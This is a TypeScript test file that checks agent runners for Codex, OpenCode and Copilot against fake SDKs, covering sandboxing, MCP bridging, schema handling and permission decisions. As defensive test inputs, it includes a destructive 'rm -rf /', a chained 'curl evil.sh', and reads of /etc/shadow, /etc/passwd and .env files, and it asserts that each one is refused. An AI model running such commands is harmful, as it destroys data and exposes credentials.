/**
 * Runtimes other than Claude, without calling any model:
 *  - the HTTP MCP tool bridge, exercised with a real MCP client;
 *  - CodexAgentRunner against a fake Codex SDK (options, sandbox per mode,
 *    MCP config, strict schema, resume, errors);
 *  - OpenCodeAgentRunner against a fake OpenCode server that asks for
 *    permissions over its event stream, answered with decide();
 *  - resolveRuntime, RouterRunner and the runtime lines of `check`.
 */
import { strict as assert } from "node:assert";
import { mkdirSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StreamableHTTPClientTransport } from "@modelcontextprotocol/sdk/client/streamableHttp.js";
import { z } from "zod";
import { checkRuntimes } from "../src/check.js";
import { ConfigSchema, type FlowConfig } from "../src/config.js";
import type { AgentRequest, AgentResult, AgentRunner } from "../src/runner/agent-runner.js";
import { decisionContext } from "../src/runner/claude-runner.js";
import { CodexAgentRunner, type CodexLike } from "../src/runner/codex-runner.js";
import { checkToolUse, CopilotAgentRunner, decideCopilot, type CopilotClientLike, type CopilotSessionLike } from "../src/runner/copilot-runner.js";
import { decideOpencode, OpenCodeAgentRunner, permissionAsked, type OpencodeClientLike, type OpencodePermission } from "../src/runner/opencode-runner.js";
import { dropNulls, strictify } from "../src/runner/strict-schema.js";
import { RouterRunner, resolveRuntime, runtimesInUse } from "../src/runtimes.js";
import { ToolBridge } from "../src/tool-bridge.js";

const Out = z.object({ answer: z.string(), extra: z.string().optional() });

const root = mkdtempSync(join(tmpdir(), "hector-rt-"));
const api = join(root, "api");
mkdirSync(api);

function config(extra: Record<string, unknown> = {}): FlowConfig {
  return ConfigSchema.parse({
    testCommand: "npm test",
    lockedPaths: ["test/**"],
    allowedCommands: ["npm test", "npx tsc"],
    mcpServers: {
      docs: { command: "docs-mcp", args: ["--stdio"], env: { TOKEN: "x" } },
      jira: { type: "http", url: "https://mcp.example.com/jira", headers: { Authorization: "Bearer y" } },
      old: { type: "sse", url: "https://mcp.example.com/sse" },
    },
    ...extra,
  });
}

function request(over: Partial<AgentRequest<typeof Out>> = {}): AgentRequest<typeof Out> {
  return {
    role: "coder",
    mode: "edit",
    cwd: api,
    systemPrompt: "You are the coder.",
    prompt: "Add the endpoint.",
    schema: Out,
    scope: { root, writeRoot: api, lockedPaths: ["api/test/**"], testPaths: ["api/test/**"], allowedCommands: ["npm test"] },
    ...over,
  };
}

async function mcpClient(url: string) {
  const client = new Client({ name: "test", version: "1.0.0" });
  await client.connect(new StreamableHTTPClientTransport(new URL(url)));
  return client;
}

const textOf = (r: unknown) => ((r as { content: Array<{ text: string }> }).content[0]!.text);

// ───────────────────────────────────────────────────────────── tool bridge

async function bridge() {
  const b = new ToolBridge();
  const saved: unknown[] = [];
  assert.equal(await b.register({}), null, "no tools, no route");
  const a = (await b.register({ ask: async (q) => `A says: ${q}`, memory: { save: async (m) => (saved.push(m), "saved") } }))!;
  const other = (await b.register({ memory: { search: async (q) => `found ${q}` } }))!;
  assert.notEqual(a.url, other.url);

  const ca = await mcpClient(a.url);
  assert.deepEqual((await ca.listTools()).tools.map((t) => t.name), ["ask", "memory_save"], "a call sees only its own tools");
  assert.equal(textOf(await ca.callTool({ name: "ask", arguments: { question: "which status code?" } })), "A says: which status code?");
  await ca.callTool({ name: "memory_save", arguments: { title: "t", content: "c", kind: "gotcha", tags: ["x"] } });
  assert.deepEqual(saved, [{ title: "t", content: "c", kind: "gotcha", tags: ["x"], files: undefined }]);
  assert.match(textOf(await ca.callTool({ name: "memory_search", arguments: { query: "q" } })), /not available/, "another call's tool is not reachable");

  const co = await mcpClient(other.url);
  assert.deepEqual((await co.listTools()).tools.map((t) => t.name), ["memory_search"]);
  await ca.close();
  await co.close();

  b.unregister(a.token);
  const gone = await fetch(a.url, { method: "POST", headers: { "content-type": "application/json" }, body: "{}" });
  assert.equal(gone.status, 404, "the URL dies with its call");
  await b.close();
  console.log("✓ tool bridge: per-call MCP routes over HTTP, isolated tools, 404 after the call");
}

// ─────────────────────────────────────────────────────────── strict schema

function strictSchema() {
  const s = strictify({
    type: "object",
    properties: { a: { type: "string" }, b: { type: "array", items: { type: "object", properties: { c: { type: "number" } } } } },
    required: ["a"],
  }) as Record<string, any>;
  assert.deepEqual(s.required, ["a", "b"]);
  assert.equal(s.additionalProperties, false);
  assert.deepEqual(s.properties.b.anyOf[1], { type: "null" }, "optional → nullable");
  assert.deepEqual(s.properties.b.anyOf[0].items.required, ["c"], "nested objects too");
  assert.deepEqual(dropNulls({ a: "x", b: null, c: [{ d: null, e: 1 }] }), { a: "x", c: [{ e: 1 }] });
  console.log("✓ strict schema: optional fields become nullable for Codex, nulls dropped before zod");
}

// ─────────────────────────────────────────────────────────────────── Codex

class FakeCodex implements CodexLike {
  calls: Array<{ kind: "start" | "resume"; id?: string; options: any; input?: string; turn?: any; mcp?: string[]; askAnswer?: string }> = [];
  constructor(
    public readonly codexOptions: any,
    private readonly reply: (input: string) => string,
    private readonly log: FakeCodex[],
  ) {
    log.push(this);
  }
  startThread(options?: any) {
    return this.thread("start", undefined, options);
  }
  resumeThread(id: string, options?: any) {
    return this.thread("resume", id, options);
  }
  private thread(kind: "start" | "resume", id: string | undefined, options: any) {
    const call: (typeof this.calls)[number] = { kind, id, options };
    this.calls.push(call);
    const self = this;
    return {
      get id() {
        return id ?? "thread-1";
      },
      async run(input: string, turn?: any) {
        call.input = input;
        call.turn = turn;
        // Like Codex would: connect to the hector MCP server it was configured with.
        const url = self.codexOptions.config?.mcp_servers?.hector?.url;
        if (url) {
          const client = await mcpClient(url);
          call.mcp = (await client.listTools()).tools.map((t) => t.name);
          call.askAnswer = textOf(await client.callTool({ name: "ask", arguments: { question: "why?" } }));
          await client.close();
        }
        return { items: [{ id: "1", type: "command_execution", command: "npm test", aggregated_output: "", status: "completed" }], finalResponse: self.reply(input), usage: null } as any;
      },
    };
  }
}

async function codex() {
  const made: FakeCodex[] = [];
  const cfg = config({ runtime: { codex: { model: "gpt-5.5-codex", effort: "medium", path: "/opt/codex" } } });
  const runner = new CodexAgentRunner(cfg, (o) => new FakeCodex(o, () => JSON.stringify({ answer: "ok", extra: null }), made));

  // edit: workspace-write rooted at the component, network off, never asks.
  const res = await runner.run(request({ ask: async (q) => `answer to ${q}`, mcpServers: ["docs", "jira", "old"], model: "gpt-5.5" }));
  assert.deepEqual(res.output, { answer: "ok" }, "nulls dropped, validated with zod");
  assert.equal(res.sessionId, "thread-1");
  assert.equal(res.costUsd, 0);
  const first = made[0]!;
  assert.equal(first.codexOptions.codexPathOverride, "/opt/codex");
  const call = first.calls[0]!;
  assert.deepEqual(
    { ...call.options },
    {
      model: "gpt-5.5",
      modelReasoningEffort: "medium",
      sandboxMode: "workspace-write",
      workingDirectory: api,
      skipGitRepoCheck: true,
      approvalPolicy: "never",
      networkAccessEnabled: false,
      webSearchMode: "disabled",
    },
  );
  const servers = first.codexOptions.config.mcp_servers;
  assert.deepEqual(servers.docs, { command: "docs-mcp", args: ["--stdio"], env: { TOKEN: "x" } });
  assert.deepEqual(servers.jira, { url: "https://mcp.example.com/jira", http_headers: { Authorization: "Bearer y" } });
  assert.equal(servers.old, undefined, "SSE is not supported by Codex");
  assert.deepEqual(call.mcp, ["ask"], "Codex reaches the workflow's ask tool through the bridge");
  assert.equal(call.askAnswer, "answer to why?");
  assert.equal((await fetch(servers.hector.url, { method: "POST" })).status, 404, "bridge route closed after the step");
  assert.match(call.input!, /^You are the coder\./, "instructions first: Codex has no system prompt option");
  assert.match(call.input!, /Write only inside .*api/);
  assert.match(call.input!, /Never modify locked test files: api\/test\/\*\*/);
  assert.match(call.input!, /Run only these commands: npm test/);
  assert.match(call.input!, /## Task\n\nAdd the endpoint\./);
  assert.equal(call.turn.outputSchema.additionalProperties, false, "strict output schema");
  assert.deepEqual(call.turn.outputSchema.required, ["answer", "extra"]);

  // readonly: read-only sandbox; tests: workspace-write at the worktree root; resume keeps the thread.
  await runner.run(request({ mode: "readonly", role: "review" }));
  assert.equal(made[1]!.calls[0]!.options.sandboxMode, "read-only");
  assert.equal(made[1]!.codexOptions.config, undefined, "no tools, no MCP config");
  await runner.run(request({ mode: "tests", role: "testAuthor" }));
  assert.equal(made[2]!.calls[0]!.options.workingDirectory, root, "the test author may write tests outside the component");
  assert.match(made[2]!.calls[0]!.input!, /Write only test files matching: api\/test\/\*\*/);
  const resumed = await runner.run(request({ resumeSessionId: "thread-9" }));
  assert.equal(made[3]!.calls[0]!.kind, "resume");
  assert.equal(made[3]!.calls[0]!.id, "thread-9");
  assert.equal(resumed.sessionId, "thread-9", "defects go back to the same Codex thread");

  // Garbage and contract violations are AgentErrors.
  const bad = new CodexAgentRunner(cfg, (o) => new FakeCodex(o, () => "I could not finish", made));
  await assert.rejects(bad.run(request()), /Codex did not return JSON/);
  const wrong = new CodexAgentRunner(cfg, (o) => new FakeCodex(o, () => JSON.stringify({ nope: 1 }), made));
  await assert.rejects(wrong.run(request()), /did not match the contract/);
  await runner.close();
  console.log("✓ codex: sandbox per mode, network off, MCP via config and bridge, strict schema, resume, errors");
}

// ──────────────────────────────────────────────────────────────── OpenCode

/** A fake `opencode serve`: during prompt() it asks for the given permissions and waits for each reply. */
class FakeOpencode {
  created: any[] = [];
  prompts: any[] = [];
  replies: Array<{ requestID: string; reply?: string; message?: string }> = [];
  added: Array<{ name?: string; directory?: string; config?: any }> = [];
  disconnected: string[] = [];
  closed = false;
  private queue: unknown[] = [];
  private wake: (() => void) | null = null;
  private waiting = new Map<string, () => void>();
  private n = 0;
  constructor(public asks: (sessionID: string) => Array<Omit<OpencodePermission, "id" | "sessionID">>) {}

  private emit(e: unknown) {
    this.queue.push(e);
    this.wake?.();
  }

  client: OpencodeClientLike = {
    global: {
      event: async ({ signal } = {}) => {
        const self = this;
        return {
          stream: (async function* () {
            while (!signal?.aborted) {
              if (!self.queue.length) await new Promise<void>((r) => ((self.wake = r), signal?.addEventListener("abort", () => r())));
              while (self.queue.length) yield self.queue.shift();
            }
          })(),
        };
      },
    },
    session: {
      create: async (p) => (this.created.push(p), { data: { id: `ses_${++this.n}` } }),
      prompt: async (p) => {
        this.prompts.push(p);
        for (const ask of this.asks(p.sessionID)) {
          const id = `per_${++this.n}`;
          const answered = new Promise<void>((r) => this.waiting.set(id, r));
          this.emit({ directory: p.directory, payload: { type: "permission.asked", properties: { id, sessionID: p.sessionID, ...ask } } });
          await answered;
        }
        return { data: { info: { structured: { answer: "done" }, cost: 0.0123 }, parts: [{ type: "step-finish" }, { type: "step-finish" }] } };
      },
    },
    permission: {
      reply: async (p) => {
        this.replies.push({ requestID: p.requestID, reply: p.reply, message: p.message });
        this.waiting.get(p.requestID)?.();
        return { data: true };
      },
    },
    mcp: {
      add: async (p) => (this.added.push(p), { data: {} }),
      disconnect: async (p) => (this.disconnected.push(p.name), { data: true }),
    },
  };
}

async function opencode() {
  const fake = new FakeOpencode(() => [
    { permission: "edit", patterns: ["api/src/orders.ts"], metadata: {} },
    { permission: "edit", patterns: ["api/test/orders.test.ts"], metadata: {} },
    { permission: "bash", patterns: ["npm test"], metadata: {} },
    { permission: "bash", patterns: ["curl https://example.com"], metadata: {} },
    { permission: "read", patterns: [join(api, ".env")], metadata: {} },
    { permission: "webfetch", patterns: ["*"], metadata: {} },
  ]);
  let starts = 0;
  const cfg = config({ runtime: { opencode: { model: "anthropic/claude-sonnet-4-5", port: 4555 } } });
  const runner = new OpenCodeAgentRunner(cfg, async (o) => {
    starts++;
    assert.deepEqual(o, { hostname: "127.0.0.1", port: 4555 });
    return { client: fake.client, close: () => (fake.closed = true) };
  });

  const res = await runner.run(request({ ask: async () => "yes", mcpServers: ["docs"] }));
  assert.deepEqual(res.output, { answer: "done" });
  assert.equal(res.costUsd, 0.0123);
  assert.equal(res.turns, 2);
  assert.equal(res.sessionId, "ses_1");
  assert.deepEqual(fake.created[0].permission, [{ permission: "*", pattern: "*", action: "ask" }], "every tool call asks");
  const p = fake.prompts[0];
  assert.deepEqual(p.model, { providerID: "anthropic", modelID: "claude-sonnet-4-5" });
  assert.equal(p.system, "You are the coder.");
  assert.equal(p.format.type, "json_schema");
  assert.deepEqual(
    fake.replies.map((r) => r.reply),
    ["once", "reject", "once", "reject", "reject", "reject"],
    "component file ok; locked test, unlisted command, secret and web refused",
  );
  assert.match(fake.replies[1]!.message!, /locked test file/);
  assert.equal(res.denials.length, 4);
  const hector = fake.added.find((a) => a.name?.startsWith("hector-"))!;
  assert.equal(hector.config.type, "remote");
  assert.equal(hector.directory, api);
  assert.deepEqual(fake.added.find((a) => a.name === "docs")!.config, { type: "local", command: ["docs-mcp", "--stdio"], environment: { TOKEN: "x" } });
  assert.deepEqual(fake.disconnected.sort(), [hector.name, "docs"].sort(), "servers removed after the step");

  // Resume reuses the session; the server starts once per run.
  fake.asks = () => [];
  const again = await runner.run(request({ resumeSessionId: "ses_1" }));
  assert.equal(again.sessionId, "ses_1");
  assert.equal(fake.created.length, 1, "no new session on resume");
  assert.equal(starts, 1);
  await runner.close();
  assert.ok(fake.closed, "close() stops opencode serve");
  console.log("✓ opencode: one server, ask-all ruleset answered by decide(), MCP add/remove, model split, cost, resume");
}

function opencodeDecisions() {
  const cfg = config();
  const ctx = { ...decisionContext(request(), cfg), mcpServers: ["hector-abc", "docs"] };
  const ask = (permission: string, patterns: string[], metadata: Record<string, unknown> = {}) =>
    decideOpencode(ctx, { id: "1", sessionID: "s", permission, patterns, metadata }, root).ok;
  assert.equal(ask("read", ["api/src/a.ts"]), true, "relative paths resolve against the worktree");
  assert.equal(ask("read", ["/etc/passwd"]), false, "outside readable roots");
  assert.equal(ask("edit", ["x"], { filepath: join(root, "web/src/a.ts") }), false, "another component's folder");
  assert.equal(ask("grep", ["TODO"], { path: api }), true);
  assert.equal(ask("external_directory", ["/home/someone/*"]), false);
  assert.equal(ask("bash", ["npm test", "rm -rf /"]), false, "every sub-command must be allowed");
  assert.equal(ask("hector-abc_ask", ["*"]), true, "this call's own bridge tools");
  assert.equal(ask("hector-xyz_ask", ["*"]), false, "another call's bridge tools");
  assert.equal(ask("docs_search", ["*"]), true);
  assert.equal(ask("question", ["*"]), false);
  assert.equal(ask("todowrite", ["*"]), true);
  const ro = { ...ctx, mode: "readonly" as const };
  assert.equal(decideOpencode(ro, { id: "1", sessionID: "s", permission: "edit", patterns: ["api/src/a.ts"], metadata: {} }, root).ok, false);
  assert.equal(permissionAsked({ type: "permission.asked", properties: { id: "a", sessionID: "b", permission: "read" } })?.patterns.length, 0);
  assert.equal(permissionAsked({ payload: { type: "session.idle", properties: {} } }), null);
  console.log("✓ opencode permissions: read/edit/grep/bash/external/MCP mapped onto decide()");
}

// ───────────────────────────────────────────────────────────────── Copilot

/** A fake Copilot runtime: during sendAndWait it fires the hook and permission requests, and calls a custom tool. */
class FakeCopilot implements CopilotClientLike {
  options: Record<string, unknown> = {};
  configs: Array<{ kind: "create" | "resume"; id?: string; config: any }> = [];
  started = 0;
  stopped = 0;
  verdicts: unknown[] = [];
  hookVerdicts: unknown[] = [];
  toolAnswers: unknown[] = [];
  prompts: any[] = [];
  constructor(
    public script: { permissions?: any[]; preTool?: Array<{ toolName: string; toolArgs: unknown }>; toolCalls?: Array<[string, unknown]>; reply?: string } = {},
    public authenticated = true,
  ) {}
  async start() {
    this.started++;
  }
  async stop() {
    this.stopped++;
  }
  async getAuthStatus() {
    return { isAuthenticated: this.authenticated, statusMessage: this.authenticated ? "ok" : "Not authenticated" };
  }
  async createSession(config: any) {
    this.configs.push({ kind: "create", config });
    return this.session(`cs_${this.configs.length}`, config);
  }
  async resumeSession(id: string, config: any) {
    this.configs.push({ kind: "resume", id, config });
    return this.session(id, config);
  }
  private session(id: string, config: any): CopilotSessionLike {
    const listeners: Record<string, Array<(e: { data?: unknown }) => void>> = {};
    return {
      sessionId: id,
      on: (type, handler) => ((listeners[type] ??= []).push(handler), () => undefined),
      disconnect: async () => undefined,
      sendAndWait: async (options) => {
        this.prompts.push(options);
        for (const h of this.script.preTool ?? []) this.hookVerdicts.push(await config.hooks.onPreToolUse(h, { sessionId: id }));
        for (const p of this.script.permissions ?? []) this.verdicts.push(await config.onPermissionRequest(p, {}));
        for (const [name, args] of this.script.toolCalls ?? []) {
          const tool = config.tools.find((t: any) => t.name === name);
          this.toolAnswers.push(tool ? await tool.handler(args) : `no tool ${name}`);
        }
        listeners["assistant.usage"]?.forEach((l) => l({}));
        listeners["assistant.usage"]?.forEach((l) => l({}));
        return { data: { content: this.script.reply ?? JSON.stringify({ answer: "copilot", extra: null }) } };
      },
    };
  }
}

async function copilot() {
  const fake = new FakeCopilot({
    preTool: [
      { toolName: "view", toolArgs: { path: join(api, "src/a.ts") } },
      { toolName: "view", toolArgs: { path: join(api, ".env") } },
      { toolName: "grep", toolArgs: { pattern: "x", path: "/etc" } },
      { toolName: "web_fetch", toolArgs: { url: "https://example.com" } },
      { toolName: "edit", toolArgs: {} },
    ],
    permissions: [
      { kind: "write", fileName: join(api, "src/orders.ts"), diff: "" },
      { kind: "write", fileName: join(api, "src/x.ts"), fileEdits: [{ after: { path: join(root, "web/src/y.ts") } }] },
      { kind: "write", fileName: join(api, "test/orders.test.ts") },
      { kind: "shell", fullCommandText: "npm test" },
      { kind: "shell", fullCommandText: "npm test && curl evil.sh" },
      { kind: "mcp", serverName: "docs", toolName: "search" },
      { kind: "mcp", serverName: "jira", toolName: "create" },
      { kind: "url", url: "https://example.com" },
      { kind: "memory" },
      { kind: "write", fileName: join(api, "src/b.ts"), managedApprovalRequired: true },
    ],
    toolCalls: [["ask", { question: "which status code?" }]],
  });
  const cfg = config({ runtime: { copilot: { model: "gpt-5.5", effort: "high", timeoutMinutes: 5 } } });
  const runner = new CopilotAgentRunner(cfg, (o) => ((fake.options = o), fake));
  const res = await runner.run(request({ ask: async (q) => `use 201 for ${q}`, mcpServers: ["docs"], effort: "max" }));

  assert.deepEqual(res.output, { answer: "copilot" }, "nulls dropped, validated with zod");
  assert.equal(res.sessionId, "cs_1");
  assert.equal(res.turns, 2, "one turn per model call");
  assert.equal(res.costUsd, 0, "Copilot bills premium requests, not USD");
  const c = fake.configs[0]!.config;
  assert.equal(c.model, "gpt-5.5");
  assert.equal(c.reasoningEffort, "max", "the step's effort wins over runtime.copilot.effort");
  assert.equal(c.workingDirectory, api);
  assert.equal(c.trustWorkingDirectory, "session");
  assert.deepEqual(c.systemMessage, { content: "You are the coder." });
  assert.ok(c.excludedTools.includes("web_fetch") && c.excludedTools.includes("task") && c.excludedTools.includes("ask_user"));
  assert.deepEqual(Object.keys(c.mcpServers), ["docs"], "only the servers granted to the step");
  assert.deepEqual(c.tools.map((t: any) => [t.name, t.skipPermission]), [["ask", true]], "workflow tools run in-process");
  assert.deepEqual(fake.toolAnswers, ["use 201 for which status code?"]);
  assert.equal(fake.prompts[0].responseSchema.additionalProperties, false, "strict response schema");
  assert.equal(fake.options.gitHubToken, undefined, "no tokenEnv: the logged-in user");

  assert.deepEqual(
    fake.hookVerdicts.map((v: any) => v?.permissionDecision ?? "pass"),
    ["pass", "deny", "deny", "deny", "pass"],
    "reads that never ask: component file ok; secret and outside folder denied; web tool denied; edits left to the handler",
  );
  assert.deepEqual(
    fake.verdicts.map((v: any) => v.kind),
    ["approve-once", "reject", "reject", "approve-once", "reject", "approve-once", "reject", "reject", "reject", "reject"],
    "component file; multi-file edit into another component; locked test; allowed command; chained command; granted MCP; ungranted MCP; web; Copilot memory; managed approval",
  );
  assert.match((fake.verdicts[2] as any).feedback, /locked test file/);
  assert.ok(res.denials.length >= 8);

  // Resume keeps the session; one runtime per run; close() stops it.
  await runner.run(request({ resumeSessionId: "cs_1" }));
  assert.equal(fake.configs[1]!.kind, "resume");
  assert.equal(fake.configs[1]!.config.trustWorkingDirectory, undefined, "trust is not available on resume");
  assert.equal(fake.started, 1);
  await runner.close();
  assert.equal(fake.stopped, 1);

  // Not signed in: fail at once instead of waiting for the timeout.
  const anon = new FakeCopilot({}, false);
  await assert.rejects(new CopilotAgentRunner(cfg, () => anon).run(request()), /Copilot is not signed in/);
  assert.equal(anon.configs.length, 0);
  // A token from tokenEnv.
  process.env.HECTOR_TEST_GH = "github_pat_test";
  const tokened = new FakeCopilot();
  const withToken = new CopilotAgentRunner(config({ runtime: { copilot: { tokenEnv: "HECTOR_TEST_GH" } } }), (o) => ((tokened.options = o), tokened));
  await withToken.run(request());
  assert.equal(tokened.options.gitHubToken, "github_pat_test");
  await assert.rejects(
    new CopilotAgentRunner(config({ runtime: { copilot: { tokenEnv: "HECTOR_MISSING" } } }), () => new FakeCopilot()).run(request()),
    /HECTOR_MISSING is not set/,
  );
  const garbage = new CopilotAgentRunner(cfg, () => new FakeCopilot({ reply: "sorry" }));
  await assert.rejects(garbage.run(request()), /Copilot did not return JSON/);
  console.log("✓ copilot: permission handler and pre-tool hook answered by decide(), in-process tools, strict schema, resume, sign-in check");
}

function copilotDecisions() {
  const ctx = decisionContext(request({ mode: "readonly" }), config());
  assert.equal(decideCopilot(ctx, { kind: "write", fileName: join(api, "src/a.ts") }).ok, false, "readonly step");
  assert.equal(decideCopilot(ctx, { kind: "read", path: join(api, "src/a.ts") }).ok, true);
  assert.equal(decideCopilot(ctx, { kind: "read", path: "/etc/shadow" }).ok, false);
  assert.equal(decideCopilot(ctx, { kind: "custom-tool", toolName: "ask" }, ["ask"]).ok, true);
  assert.equal(decideCopilot(ctx, { kind: "custom-tool", toolName: "other" }, ["ask"]).ok, false);
  assert.equal(decideCopilot(ctx, { kind: "hook" }).ok, false, "unknown kinds are refused");
  assert.equal(checkToolUse(ctx, "glob", { pattern: "**/*.ts" }).ok, true, "no path: the working directory");
  assert.equal(checkToolUse(ctx, "task", {}).ok, false);
  console.log("✓ copilot permissions: read/write/shell/MCP/custom tools mapped onto decide(); unknown kinds refused");
}

// ───────────────────────────────────────────────────── routing and check

async function routing() {
  const cfg = config({
    models: { review: "opus", coder: "sonnet" },
    efforts: { coder: "high" },
    runtime: {
      default: "claude",
      steps: { coder: "codex", review: { use: "opencode", model: "openai/gpt-5.5" }, plan: { use: "claude", model: "opus", effort: "max" }, qaPlan: "copilot" },
      opencode: { model: "anthropic/claude-sonnet-4-5" },
    },
    review: { judges: [{ name: "a" }, { name: "b", runtime: "claude", model: "haiku" }] },
  });
  const step = (model?: string, effort?: any) => ({ model, effort });
  assert.deepEqual(resolveRuntime(cfg, "coder", step("sonnet", "high")), { runtime: "codex", model: undefined, effort: "high" }, "Claude model ignored, generic effort kept for Codex");
  assert.deepEqual(resolveRuntime(cfg, "review", step("opus")), { runtime: "opencode", model: "openai/gpt-5.5", effort: undefined });
  assert.deepEqual(resolveRuntime(cfg, "plan", step("sonnet", "low")), { runtime: "claude", model: "opus", effort: "max" });
  assert.deepEqual(resolveRuntime(cfg, "enrich", step("sonnet")), { runtime: "claude", model: "sonnet", effort: undefined });
  assert.deepEqual(resolveRuntime(cfg, "review", step("opus"), cfg.review.judges[0]), { runtime: "opencode", model: "openai/gpt-5.5", effort: undefined }, "judge inherits the step runtime");
  assert.deepEqual(resolveRuntime(cfg, "review", step("opus"), cfg.review.judges[1]), { runtime: "claude", model: "haiku", effort: undefined }, "judge runtime wins");
  assert.deepEqual(resolveRuntime(cfg, "qaPlan", step("haiku", "low")), { runtime: "copilot", model: undefined, effort: "low" }, "Copilot: Claude alias ignored, effort kept");
  assert.deepEqual([...runtimesInUse(cfg)].sort(), ["claude", "codex", "copilot", "opencode"]);
  assert.throws(() => config({ runtime: { opencode: { model: "no-provider" } } }), /provider\/model/);

  const used: string[] = [];
  const closed: string[] = [];
  const fake = (name: string): AgentRunner => ({
    run: async <S extends z.ZodType>(req: AgentRequest<S>) => (used.push(`${name}:${req.role}`), { output: {} } as AgentResult<z.infer<S>>),
    close: async () => void closed.push(name),
  });
  let made = 0;
  const router = new RouterRunner("claude", { claude: () => (made++, fake("claude")), codex: () => (made++, fake("codex")), opencode: () => (made++, fake("opencode")) });
  await router.run(request({ role: "plan" }));
  await router.run(request({ role: "coder", runtime: "codex" }));
  await router.run(request({ role: "coder", runtime: "codex" }));
  assert.deepEqual(used, ["claude:plan", "codex:coder", "codex:coder"]);
  assert.equal(made, 2, "runners are created lazily, once");
  await router.close();
  assert.deepEqual(closed.sort(), ["claude", "codex"], "close() reaches every runner used");

  const lines = await checkRuntimes(cfg, async () => false, async () => ({ ok: false, message: "Not authenticated. Run `copilot login`." }));
  const text = lines.map((l) => `${l.ok ? "ok" : "FAIL"}${l.warn ? "/warn" : ""} ${l.label}`).join("\n");
  assert.match(text, /ok runtimes: enrich=claude plan=claude testAuthor=claude coder=codex .*review=opencode/);
  assert.match(text, /ok\/warn codex steps: the read deny-list and the command allowlist are not enforced/);
  assert.match(text, /ok\/warn codex cannot use SSE MCP servers: old/);
  assert.match(text, /FAIL opencode is installed/);
  assert.match(text, /ok copilot: using COPILOT_GITHUB_TOKEN, GH_TOKEN, GITHUB_TOKEN, your `copilot login` session/);
  assert.match(text, /FAIL copilot is signed in/);
  assert.deepEqual(await checkRuntimes(config(), async () => false), [], "Claude only: nothing to report");
  console.log("✓ routing: runtime/model/effort precedence, lazy router with close(), check reports runtimes");
}

await bridge();
strictSchema();
await codex();
await opencode();
opencodeDecisions();
await copilot();
copilotDecisions();
await routing();
console.log("\nruntime checks passed");
